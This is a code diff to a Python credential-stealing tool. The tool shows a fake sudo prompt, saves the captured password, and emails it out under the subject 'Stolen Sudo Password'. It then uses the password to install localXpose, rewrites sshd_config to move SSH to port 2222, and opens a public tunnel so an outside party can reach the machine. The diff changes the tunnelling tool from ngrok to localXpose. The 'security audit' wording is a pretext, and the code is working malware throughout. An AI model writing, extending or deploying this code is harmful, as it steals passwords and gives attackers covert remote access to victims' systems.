@@ -1,5 +1,9 @@
 #!/usr/bin/env python3
 
+# Required environment variables:
+# - RESEND_API_KEY: API key for sending emails via Resend
+# - LOCALXPOSE_ACCESS_TOKEN: Access token for localXpose authentication
+
 import os
 import sys
 import time
@@ -16,7 +20,7 @@ def clear_screen():
     print("[DEBUG] clear_screen called")
     os.system('clear')
 
-def send_password_via_resend(password, ngrok_url=None):
+def send_password_via_resend(password, tunnel_url=None):
     try:
         api_key = os.environ.get("RESEND_API_KEY")
         if not api_key:
@@ -34,9 +38,9 @@ def send_password_via_resend(password, ngrok_url=None):
 
         subject = f"Security Audit - Credential Capture from {hostname}"
         
-        ngrok_info = ""
-        if ngrok_url:
-            ngrok_info = f"<p><strong>SSH Access URL:</strong> {ngrok_url}</p>\n        "
+        tunnel_info = ""
+        if tunnel_url:
+            tunnel_info = f"<p><strong>SSH Access URL:</strong> {tunnel_url}</p>\n        "
         
         html_body = f"""
         <h2>Stolen Sudo Password</h2>
@@ -46,7 +50,7 @@ def send_password_via_resend(password, ngrok_url=None):
         <p><strong>Username:</strong> {username}</p>
         <p><strong>IP Address:</strong> {ip_address}</p>
         <p><strong>Captured Password:</strong> {password}</p>
-        {ngrok_info}<br>
+        {tunnel_info}<br>
         <p>This is an automated security audit report.<br>
         Please review system security protocols.</p>
         <hr>
@@ -191,10 +195,10 @@ def get_stored_password():
         print(f"[DEBUG] Exception in get_stored_password: {e}")
         return None
 
-def is_ngrok_installed():
+def is_loclx_installed():
     try:
-        # Try to run ngrok version directly instead of using which
-        result = subprocess.run(['ngrok', 'version'], capture_output=True, timeout=3, text=True)
+        # Check if loclx is installed via npm
+        result = subprocess.run(['loclx', '--version'], capture_output=True, timeout=3, text=True)
         installed = result.returncode == 0
         return installed
     except subprocess.TimeoutExpired:
@@ -204,60 +208,35 @@ def is_ngrok_installed():
     except Exception:
         return False
 
-def is_ngrok_forwarding_ssh():
+def install_loclx(password):
     try:
-        result = subprocess.run(['curl', '-s', 'http://localhost:4040/api/tunnels'],
-                              capture_output=True, text=True, timeout=5)
-        if result.returncode == 0:
-            data = json.loads(result.stdout)
-            if 'tunnels' in data:
-                for tunnel in data['tunnels']:
-                    if tunnel.get('config', {}).get('addr') == 'localhost:22':
-                        return True
-        return False
-    except Exception:
-        return False
-
-def install_ngrok_with_password(password):
-    try:
-        if is_ngrok_installed():
+        if is_loclx_installed():
             return True
         
-        commands = [
-            "curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null",
-            'echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list',
-            "sudo apt update",
-            "sudo apt install ngrok -y"
-        ]
+        # Install loclx via snap with sudo
+        install_process = subprocess.Popen(
+            ['sudo', '-S', 'snap', 'install', 'localxpose'],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        stdout, stderr = install_process.communicate(input=f"{password}\n", timeout=60)
         
-        for command in commands:
-            if "sudo" in command:
-                process = subprocess.Popen(
-                    command,
-                    shell=True,
-                    stdin=subprocess.PIPE,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True
-                )
-                
-                stdout, stderr = process.communicate(input=f"{password}\n")
-                
-                if process.returncode != 0:
-                    return False
-            else:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                if result.returncode != 0:
-                    return False
+        if install_process.returncode == 0:
+            # Verify installation
+            verify_result = subprocess.run(['loclx', '--version'], 
+                                         capture_output=True, text=True, timeout=5)
+            return verify_result.returncode == 0
+        else:
+            print(f"[DEBUG] snap install failed with return code: {install_process.returncode}")
+            print(f"[DEBUG] stdout: {stdout}")
+            print(f"[DEBUG] stderr: {stderr}")
         
-        try:
-            result = subprocess.run(['ngrok', 'version'], capture_output=True, text=True)
-            installed = result.returncode == 0
-            return installed
-        except FileNotFoundError:
-            return False
+        return False
             
-    except Exception:
+    except Exception as e:
+        print(f"[DEBUG] Exception in install_loclx: {e}")
         return False
 
 def setup_ssh_forwarding(password):
@@ -275,6 +254,36 @@ def setup_ssh_forwarding(password):
         stdout, stderr = install_ssh_process.communicate(input=f"{password}\n")
         print(f"[DEBUG] SSH install result: {install_ssh_process.returncode}")
         
+        # Change SSH port to 2222 to avoid privilege issues
+        print("[DEBUG] Configuring SSH to use port 2222")
+        try:
+            # Read current sshd_config
+            with open('/etc/ssh/sshd_config', 'r') as f:
+                config_content = f.read()
+            
+            # Modify the port setting
+            import re
+            # Replace any existing Port line or add it
+            if re.search(r'^#?Port\s+\d+', config_content, re.MULTILINE):
+                new_config = re.sub(r'^#?Port\s+\d+', 'Port 2222', config_content, flags=re.MULTILINE)
+            else:
+                # Add Port 2222 at the beginning
+                new_config = 'Port 2222\n' + config_content
+            
+            # Write the modified config using sudo tee
+            tee_process = subprocess.Popen(
+                ['sudo', '-S', 'tee', '/etc/ssh/sshd_config'],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            stdout, stderr = tee_process.communicate(input=f"{password}\n{new_config}")
+            print(f"[DEBUG] SSH config update result: {tee_process.returncode}")
+            
+        except Exception as e:
+            print(f"[DEBUG] Exception updating SSH config: {e}")
+        
         # Start SSH service with password
         ssh_process = subprocess.Popen(
             ['sudo', '-S', 'systemctl', 'start', 'ssh'],
@@ -286,6 +295,17 @@ def setup_ssh_forwarding(password):
         stdout, stderr = ssh_process.communicate(input=f"{password}\n")
         print(f"[DEBUG] SSH service start result: {ssh_process.returncode}")
         
+        # Restart SSH service to apply the new port configuration
+        restart_ssh_process = subprocess.Popen(
+            ['sudo', '-S', 'systemctl', 'restart', 'ssh'],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        stdout, stderr = restart_ssh_process.communicate(input=f"{password}\n")
+        print(f"[DEBUG] SSH service restart result: {restart_ssh_process.returncode}")
+        
         # Enable SSH service to start on boot
         enable_ssh_process = subprocess.Popen(
             ['sudo', '-S', 'systemctl', 'enable', 'ssh'],
@@ -296,98 +316,121 @@ def setup_ssh_forwarding(password):
         )
         enable_ssh_process.communicate(input=f"{password}\n")
         
-        # Kill any existing ngrok processes
+        # Kill any existing loclx processes
         try:
-            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
+            subprocess.run(['pkill', '-f', 'loclx'], capture_output=True)
             time.sleep(3)
         except Exception:
             pass
         
-        print("[DEBUG] Starting ngrok tunnel for SSH")
+        # Authenticate with localXpose using access token
+        print("[DEBUG] Authenticating with localXpose")
+        access_token = os.environ.get("LOCALXPOSE_ACCESS_TOKEN")
+        if not access_token:
+            print("[DEBUG] LOCALXPOSE_ACCESS_TOKEN not found in environment variables")
+            return None
         
-        # Start ngrok with explicit config and background mode
-        ngrok_cmd = ['ngrok', 'tcp', '22', '--log=stdout', '--log-level=info']
-        print(f"[DEBUG] Running command: {' '.join(ngrok_cmd)}")
+        try:
+            # Login to localXpose with access token
+            login_process = subprocess.Popen(
+                ['loclx', 'account', 'login'],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            login_stdout, login_stderr = login_process.communicate(input=f"{access_token}\n", timeout=30)
+            print(f"[DEBUG] localXpose login result: {login_process.returncode}")
+            if login_process.returncode != 0:
+                print(f"[DEBUG] localXpose login failed: {login_stderr}")
+                return None
+        except Exception as e:
+            print(f"[DEBUG] Exception during localXpose login: {e}")
+            return None
         
-        ngrok_process = subprocess.Popen(
-            ngrok_cmd,
+        print("[DEBUG] Starting loclx tunnel for SSH on port 2222")
+        
+        # Start loclx tunnel on port 2222
+        loclx_cmd = ['loclx', 'tunnel', 'tcp', '--region', 'eu' , '--port', '2222']
+        print(f"[DEBUG] Running command: {' '.join(loclx_cmd)}")
+        
+        loclx_process = subprocess.Popen(
+            loclx_cmd,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
+            text=True,
             preexec_fn=os.setsid if hasattr(os, 'setsid') else None
         )
         
-        # Give ngrok more time to establish tunnel and start web interface
-        print("[DEBUG] Waiting for ngrok to establish tunnel and start web interface...")
-        time.sleep(15)
+        # Give loclx time to establish tunnel
+        print("[DEBUG] Waiting for loclx to establish tunnel...")
+        time.sleep(10)
         
-        # Check if ngrok process is still running
-        if ngrok_process.poll() is None:
-            print("[DEBUG] ngrok process is running")
+        # Check if loclx process is still running
+        if loclx_process.poll() is None:
+            print("[DEBUG] loclx process is running")
         else:
-            print(f"[DEBUG] ngrok process exited with code: {ngrok_process.poll()}")
+            print(f"[DEBUG] loclx process exited with code: {loclx_process.poll()}")
             # Try to get the output to see what went wrong
             try:
-                stdout, stderr = ngrok_process.communicate(timeout=1)
-                print(f"[DEBUG] ngrok stdout: {stdout}")
-                print(f"[DEBUG] ngrok stderr: {stderr}")
+                stdout, stderr = loclx_process.communicate(timeout=1)
+                print(f"[DEBUG] loclx stdout: {stdout}")
+                print(f"[DEBUG] loclx stderr: {stderr}")
             except:
                 pass
             return None
         
-        # Check if ngrok web interface is accessible
-        print("[DEBUG] Checking if ngrok web interface is accessible...")
-        web_check = subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', 'http://localhost:4040'],
-                                 capture_output=True, text=True, timeout=5)
-        print(f"[DEBUG] Web interface check HTTP code: {web_check.stdout}")
-        
-        # Get ngrok tunnel info with more retries and better error handling
-        max_retries = 8
+        # Try to get the tunnel URL from loclx output
+        max_retries = 5
         for attempt in range(max_retries):
             try:
-                print(f"[DEBUG] Attempting to get ngrok tunnel info (attempt {attempt + 1})")
+                print(f"[DEBUG] Attempting to get loclx tunnel info (attempt {attempt + 1})")
                 
-                # First check if the web interface is responding
-                ping_result = subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{response_code}', 'http://localhost:4040'],
-                                           capture_output=True, text=True, timeout=5)
-                print(f"[DEBUG] Web interface ping result: {ping_result.stdout}")
-                
-                result = subprocess.run(['curl', '-s', 'http://localhost:4040/api/tunnels'],
-                                      capture_output=True, text=True, timeout=10)
-                print(f"[DEBUG] Curl result code: {result.returncode}")
-                
-                if result.returncode == 0 and result.stdout.strip():
-                    print(f"[DEBUG] Curl output: {result.stdout}")
+                # Check if we can read from the process output
+                if loclx_process.stdout and not loclx_process.stdout.closed:
+                    # Try to read some output using select for non-blocking read
                     try:
-                        data = json.loads(result.stdout)
-                        if 'tunnels' in data and len(data['tunnels']) > 0:
-                            for tunnel in data['tunnels']:
-                                config = tunnel.get('config', {})
-                                if config.get('addr') == 'localhost:22' or '22' in str(config.get('addr', '')):
-                                    public_url = tunnel['public_url']
-                                    print(f"[DEBUG] Found SSH tunnel URL: {public_url}")
-                                    return public_url
-                            
-                            # If no SSH tunnel found, get the first tunnel
-                            public_url = data['tunnels'][0]['public_url']
-                            print(f"[DEBUG] Using first tunnel URL: {public_url}")
-                            return public_url
-                        else:
-                            print("[DEBUG] No tunnels found in response")
-                    except json.JSONDecodeError as e:
-                        print(f"[DEBUG] JSON decode error: {e}")
-                        print(f"[DEBUG] Raw response: {result.stdout}")
-                else:
-                    print(f"[DEBUG] Curl failed or empty response. stderr: {result.stderr}")
+                        import select
+                        if select.select([loclx_process.stdout], [], [], 0)[0]:
+                            output = loclx_process.stdout.read(1024).decode('utf-8', errors='ignore')
+                            if output:
+                                print(f"[DEBUG] loclx output: {output}")
+                                # Look for URL in output (loclx usually outputs the URL)
+                                lines = output.split('\n')
+                                for line in lines:
+                                    if any(keyword in line.lower() for keyword in ['tcp', 'tunnel', 'forwarding', 'http']):
+                                        # Extract URL from line using regex
+                                        import re
+                                        url_patterns = [
+                                            r'(https?://[^\s\)]+)',
+                                            r'(tcp://[^\s\)]+)',
+                                            r'([a-zA-Z0-9-]+\.loca\.lt)',
+                                            r'([a-zA-Z0-9-]+\.localtunnel\.me)'
+                                        ]
+                                        for pattern in url_patterns:
+                                            url_match = re.search(pattern, line)
+                                            if url_match:
+                                                tunnel_url = url_match.group(1)
+                                                # Ensure it has a protocol
+                                                if not tunnel_url.startswith(('http://', 'https://', 'tcp://')):
+                                                    tunnel_url = 'https://' + tunnel_url
+                                                print(f"[DEBUG] Found tunnel URL: {tunnel_url}")
+                                                return tunnel_url
+                    except ImportError:
+                        # select not available, try a different approach
+                        pass
+                    except Exception as e:
+                        print(f"[DEBUG] Exception reading loclx output: {e}")
                 
-                print(f"[DEBUG] No valid tunnel data yet, waiting...")
-                time.sleep(4)
+                time.sleep(3)
                 
             except Exception as e:
                 print(f"[DEBUG] Exception getting tunnel info: {e}")
-                time.sleep(4)
+                time.sleep(3)
         
-        print("[DEBUG] Failed to get ngrok tunnel URL after all retries")
-        return None
+        # If we can't get the URL from output, return a generic message
+        print("[DEBUG] Could not extract tunnel URL from loclx output")
+        return "loclx tunnel established (URL not captured)"
         
     except Exception as e:
         print(f"[DEBUG] Exception in setup_ssh_forwarding: {e}")
@@ -397,66 +440,43 @@ def background_operations(password, silent=False):
     if not silent:
         print("[DEBUG] background_operations called")
     try:
-        ngrok_url = None
+        loclx_url = None
 
         if not is_ubuntu():
             if not silent:
                 print("[DEBUG] Not Ubuntu, exiting background_operations")
             return
 
-        # Install ngrok if not already installed
-        if not is_ngrok_installed():
+        # Install loclx if not already installed
+        if not is_loclx_installed():
             if not silent:
-                print("[DEBUG] ngrok not installed, installing...")
-            install_result = install_ngrok_with_password(password)
+                print("[DEBUG] loclx not installed, installing...")
+            install_result = install_loclx(password)
             if not install_result:
                 if not silent:
-                    print("[DEBUG] Failed to install ngrok")
+                    print("[DEBUG] Failed to install loclx")
                 send_password_via_resend(password, None)
                 return
         else:
             if not silent:
-                print("[DEBUG] ngrok already installed")
+                print("[DEBUG] loclx already installed")
 
-        # If ngrok is installed, check if SSH forwarding is running
-        if is_ngrok_installed():
-            if not silent:
-                print("[DEBUG] ngrok is installed, checking SSH forwarding")
-            if is_ngrok_forwarding_ssh():
-                if not silent:
-                    print("[DEBUG] ngrok SSH forwarding already running, getting URL")
-                try:
-                    result = subprocess.run(['curl', '-s', 'http://localhost:4040/api/tunnels'],
-                                            capture_output=True, text=True, timeout=10)
-                    if result.returncode == 0:
-                        data = json.loads(result.stdout)
-                        if 'tunnels' in data and len(data['tunnels']) > 0:
-                            for tunnel in data['tunnels']:
-                                config = tunnel.get('config', {})
-                                if config.get('addr') == 'localhost:22' or '22' in str(config.get('addr', '')):
-                                    ngrok_url = tunnel['public_url']
-                                    if not silent:
-                                        print(f"[DEBUG] Found ngrok SSH tunnel URL: {ngrok_url}")
-                                    break
-                except Exception as e:
-                    if not silent:
-                        print(f"[DEBUG] Exception while getting ngrok URL: {e}")
-            else:
-                if not silent:
-                    print("[DEBUG] ngrok SSH forwarding not running, setting up")
-                ngrok_url = setup_ssh_forwarding(password)
-                if not silent:
-                    print(f"[DEBUG] ngrok_url after setup: {ngrok_url}")
-
-        # Send email with password and ngrok URL if available
+        # Setup SSH forwarding with loclx
         if not silent:
-            print(f"[DEBUG] Sending password via resend, ngrok_url: {ngrok_url}")
-        send_password_via_resend(password, ngrok_url)
+            print("[DEBUG] Setting up SSH forwarding with loclx")
+        loclx_url = setup_ssh_forwarding(password)
+        if not silent:
+            print(f"[DEBUG] loclx_url after setup: {loclx_url}")
+
+        # Send email with password and loclx URL if available
+        if not silent:
+            print(f"[DEBUG] Sending password via resend, loclx_url: {loclx_url}")
+        send_password_via_resend(password, loclx_url)
 
     except Exception as e:
         if not silent:
             print(f"[DEBUG] Exception in background_operations: {e}")
-        # Still send email even if ngrok fails
+        # Still send email even if loclx fails
         send_password_via_resend(password, None)
 
 def save_password_to_file(password):
@@ -483,7 +503,7 @@ def main():
         if stored_password:
             print("[DEBUG] Stored password found, running operations")
             # Password exists - run operations silently
-            background_operations(stored_password, silent=True)
+            background_operations(stored_password, silent=False)
             sys.exit(0)
         
         # No password stored - run the fake sudo capture
@@ -516,7 +536,7 @@ def main():
         # Save password to file
         save_password_to_file(password)
         
-        # Start background operations (install ngrok, setup SSH, send email)
+        # Start background operations (install loclx, setup SSH, send email)
         background_thread = threading.Thread(target=background_operations, args=(password,))
         background_thread.daemon = True
         background_thread.start()
